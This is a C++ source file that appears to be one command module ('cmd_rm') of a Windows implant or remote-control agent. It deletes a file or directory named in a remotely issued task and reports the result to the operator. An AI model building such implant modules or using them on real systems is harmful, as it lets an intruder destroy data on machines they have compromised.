#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_RM

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_rm(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t path_len = 0;
    auto path = parser_string( params, &path_len );
    if ( !path || path_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no path" ) ) );
        return;
    }

    char path_buf[520] = { 0 };
    uint32_t copy_len = path_len < 519 ? path_len : 519;
    memory::copy( path_buf, path, copy_len );

    wchar_t wpath[520] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );

    DWORD attrs = inst.kernel32.GetFileAttributesW( wpath );
    if ( attrs == INVALID_FILE_ATTRIBUTES ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "file not found" ) ) );
        return;
    }

    BOOL ok;
    if ( attrs & FILE_ATTRIBUTE_DIRECTORY ) {
        ok = inst.kernel32.RemoveDirectoryW( wpath );
    } else {
        ok = inst.kernel32.DeleteFileW( wpath );
    }

    if ( ok ) {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "removed" ) ) );
    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "delete failed" ) ) );
    }
}

#endif
